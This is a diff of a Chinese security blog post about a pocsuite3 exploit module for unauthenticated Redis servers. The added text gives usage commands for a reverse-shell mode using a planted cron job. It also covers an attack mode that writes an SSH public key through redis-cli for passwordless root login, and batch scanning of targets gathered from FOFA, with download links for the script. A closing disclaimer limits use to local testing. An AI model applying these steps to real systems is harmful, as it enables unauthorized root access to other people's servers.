@@ -45,7 +45,7 @@
         content="2021-07-19">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-09">
+        content="2021-08-14">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -289,7 +289,7 @@
     
     
       <span class="dot"></span>
-      <span>336 字</span>
+      <span>653 字</span>
     
   </div>
   
@@ -322,11 +322,48 @@
 <pre class="highlight"><span class="line">[ERROR] thread MainThread: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\threads.py&quot;, line 47, in run_threads</span><br><span class="line">    thread_function(*args)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\controller\controller.py&quot;, line 148, in task_run</span><br><span class="line">    result = poc_module.execute(target, headers=conf.http_headers, mode=conf.mode, verbose=False)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\poc.py&quot;, line 229, in execute</span><br><span class="line">    output.params = self.params</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br></pre>
 
 <p>搜了一下，应该是某个值为空，然后空值被调用了，导致报错。但是我的shell里面没写空值，看报错，也都是系统函数报错的，盲猜可能是不会使用pocsuite3的shell模块导致的。有了解的大佬请留言指正，感谢！</p>
+<hr>
+<p>分割线 2021-08-14</p>
+<hr>
+<p>修复反弹shell空值报错；优化attack模块，改写脚本为ssh连接</p>
+<p><strong>使用须知：</strong></p>
+<pre class="highlight"><span class="line">attack模式下：</span><br><span class="line">需要redis-cli客户端命令</span><br><span class="line">安装：</span><br><span class="line">	wget http://download.redis.io/redis-stable.tar.gz #下载redis-cli</span><br><span class="line">	tar -zxvf redis-stable.tar.gz</span><br><span class="line">	cd redis-stable </span><br><span class="line">	make </span><br><span class="line">	cp src/redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line">需要提前在本地生成公钥文件</span><br><span class="line">方法：</span><br><span class="line">	1、ssh-keygen -t rsa  生成密钥（管理员权限）</span><br><span class="line">	2、(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">	3、在公钥目录执行命令，并将key.txt移动到脚本目录</span><br><span class="line">	注：windows在用户目录/.ssh下，linux在/root/.ssh/下</span><br></pre>
+
+
+
+<p><strong>使用过程：</strong></p>
+<p>1、<code>--verify </code>    验证模式</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --verify</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" alt="image-20210814221643832" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814221643832.png" class="lozad post-image"></p>
+<p>2、<code>--shell</code>    反弹shell</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --shell</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" alt="image-20210814222129814" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222129814.png" class="lozad post-image"></p>
+<p>需要等待反弹shell定时任务生效，约1分钟</p>
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" alt="image-20210814222420607" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814222420607.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">list:列出反弹shell列表</span><br><span class="line">use:使用指定反弹shell</span><br></pre>
+
+
+
+<p>3、ssh连接</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -u 192.168.21.237 --attack</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" alt="image-20210814223217104" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223217104.png" class="lozad post-image"></p>
+<p>执行<code>ssh root@192.168.21.237</code>，成功无密码连接靶机</p>
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" alt="image-20210814223320023" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223320023.png" class="lozad post-image"></p>
+<p>可搭配fofa搜索，导出目标列表，批量验证。</p>
+<pre class="highlight"><span class="line">pocsuite -r _89715_redis_login_bypass.py -f ./test.txt --threads 20 --verify</span><br></pre>
+
+<p> <img src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" alt="image-20210814223939569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/image-20210814223939569.png" class="lozad post-image"></p>
+<p>警告！</p>
+<p>shell、attack模式严禁用于非法用途，仅做本地测试及pocsuite编写学习！</p>
 <p>下载地址：</p>
 <p>旧版（爆破功能）</p>
 <p><a href="https://www.zerochen.top/download/Redis/redis.py">https://www.zerochen.top/download/Redis/redis.py</a></p>
 <p>新版（pocsuite3模块）</p>
-<p><a href="https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py</a></p>
+<p><del><a href="https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/89715_redis_login_bypass.py</a></del></p>
+<p><a href="https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py">https://www.zerochen.top/download/Redis/_89715_redis_login_bypass.py</a></p>
 
   </div>
   <div>
@@ -450,7 +487,7 @@
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>43</span>
+    <span>44</span>
     <span>文章</span>
   </a>
   <a 
@@ -462,7 +499,7 @@
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>43</span>
+    <span>44</span>
     <span>标签</span>
   </a>
 </div>
@@ -539,7 +576,7 @@
       <a href="/categories/Python/">
         <div class="categories-list-item">
           Python
-          <span class="categories-list-item-badge">4</span>
+          <span class="categories-list-item-badge">5</span>
         </div>
       </a>
     
@@ -596,15 +633,15 @@
       </a>
     
       <a 
-        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
-        title="文件包含">
-        <div class="tags-list-item">文件包含</div>
-      </a>
-    
-      <a 
         href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
         title="文件上传">
         <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
       </a>
     
       <a 
@@ -632,15 +669,15 @@
       </a>
     
       <a 
-        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
-        title="命令执行">
-        <div class="tags-list-item">命令执行</div>
-      </a>
-    
-      <a 
         href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
         title="反弹shell">
         <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
       </a>
     
       <a 
@@ -656,15 +693,15 @@
       </a>
     
       <a 
-        href="/tags/DVWA/" 
-        title="DVWA">
-        <div class="tags-list-item">DVWA</div>
-      </a>
-    
-      <a 
         href="/tags/SSRF/" 
         title="SSRF">
         <div class="tags-list-item">SSRF</div>
+      </a>
+    
+      <a 
+        href="/tags/XXE/" 
+        title="XXE">
+        <div class="tags-list-item">XXE</div>
       </a>
     
   </div>
@@ -700,6 +737,11 @@
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-15</div>
+        <a href="/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/"><div class="recent-posts-item-content">Python之爆破脚本</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-08-06</div>
         <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
       </div>
@@ -712,11 +754,6 @@
       <div class="recent-posts-item">
         <div class="recent-posts-item-title">2021-08-05</div>
         <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
-      </div>
-    
-      <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-08-05</div>
-        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
       </div>
     
   </div>
